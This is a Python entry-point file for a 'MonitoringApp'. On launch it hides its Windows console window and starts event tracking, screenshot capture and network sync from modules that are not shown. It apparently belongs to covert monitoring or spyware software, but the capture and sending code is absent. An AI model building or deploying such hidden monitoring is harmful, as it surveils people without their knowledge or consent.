import os
import sys
import time
import signal
import ctypes
from pathlib import Path

# Add src directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import Config
from storage_manager import StorageManager
from event_tracker import EventTracker
from screenshot_manager import ScreenshotManager
from network_sync import NetworkSync

class MonitoringApp:
    """Main monitoring application"""
    
    def __init__(self):
        self.storage_manager = None
        self.event_tracker = None
        self.screenshot_manager = None
        self.network_sync = None
        self.running = False
    
    def hide_console(self):
        """Hide console window on Windows"""
        try:
            # Get console window handle
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                # Hide the window
                ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass
    
    def setup(self):
        """Initialize all components"""
        # Ensure storage directories exist
        Config.ensure_directories()
        
        # Initialize storage manager
        self.storage_manager = StorageManager()
        
        # Initialize event tracker
        self.event_tracker = EventTracker(self.storage_manager)
        
        # Initialize screenshot manager
        self.screenshot_manager = ScreenshotManager(self.storage_manager)
        
        # Initialize network sync
        self.network_sync = NetworkSync(self.storage_manager)
    
    def start(self):
        """Start all monitoring components"""
        if self.running:
            return
        
        self.running = True
        
        # Start event tracking
        self.event_tracker.start()
        
        # Start screenshot capture
        self.screenshot_manager.start()
        
        # Start network sync
        self.network_sync.start()
    
    def stop(self):
        """Stop all monitoring components"""
        self.running = False
        
        if self.event_tracker:
            self.event_tracker.stop()
        
        if self.screenshot_manager:
            self.screenshot_manager.stop()
        
        if self.network_sync:
            self.network_sync.stop()
    
    def run(self):
        """Main run loop"""
        # Hide console window
        self.hide_console()
        
        # Setup components
        self.setup()
        
        # Start monitoring
        self.start()
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

def signal_handler(signum, frame):
    """Handle termination signals"""
    sys.exit(0)

def main():
    """Entry point"""
    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Create and run app
    app = MonitoringApp()
    app.run()

if __name__ == '__main__':
    main()
